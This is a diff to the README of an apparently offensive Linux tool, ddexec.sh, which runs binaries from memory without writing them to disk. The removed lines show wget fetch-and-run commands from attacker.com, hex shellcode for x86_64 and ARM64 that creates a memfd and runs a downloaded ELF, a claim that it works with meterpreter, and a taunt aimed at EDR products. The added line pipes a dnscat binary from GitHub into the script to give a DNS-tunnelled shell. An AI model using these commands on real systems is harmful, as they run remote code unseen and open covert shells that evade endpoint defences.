@@ -11,47 +11,10 @@ Here, try this:
 ```
 base64 -w0 /bin/ls | bash ddexec.sh ls -lA
 ```
-which is easily weaponizable with something like
+which is easily weaponizable with something like - dnscat :D 
 ```
-wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
+curl -L --output - https://github.com/ralvares/dns-shell/blob/main/dnscat?raw=true | base64 -w0 | bash <(curl https://raw.githubusercontent.com/ralvares/dns-shell/main/ddexec.sh) /bin/entrypoint -h
 ```
-
-There is also the `ddsc.sh` script that allows you to run binary code directly.
-The following is an example of the use of a shellcode that will create a memfd (a file descriptor pointing to a file in memory) to which we can later write binaries and run them, from memory obviously.
-```
-bash ddsc.sh -x <<< "68444541444889e74831f64889f0b401b03f0f054889c7b04d0f05b0220f05" &
-cd /proc/$!/fd
-wget -O 4 https://attacker.com/binary.elf
-./4
-```
-In ARM64 the process is similar, only the shellcode changes
-```
-bash ddsc.sh -x <<< "802888d2a088a8f2e00f1ff8e0030091210001cae82280d2010000d4c80580d2010000d4881580d2010000d4610280d2281080d2010000d4"
-```
-
-And yes. It works with meterpreter.
-
-Tested Linux distributions are Debian, Alpine and Arch. Supported shells are bash, zsh and ash (busybox); on x86_64 and aarch64 (arm64) architectures.
-
-### EverythingExec
-As of 12/12/2022 I have found a number of alternatives to `dd`, one of which, `tail`, is currently the default program used to `lseek()` through the `mem` file (which was the sole purpose for using `dd`). Said alternatives are:
-```
-tail
-hexdump
-cmp
-xxd
-```
-
-Setting the variable `SEEKER` you may change the seeker used, *e. g.*:
-```
-SEEKER=cmp bash ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)
-```
-
-If you find another valid seeker not implemented in the script you may still use it setting the `SEEKER_ARGS` variable:
-```
-SEEKER=xxd SEEKER_ARGS='-s $offset' zsh ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)
-```
-Block this, EDRs.
 
 ## Dependencies
 This script depends on the following tools to work.
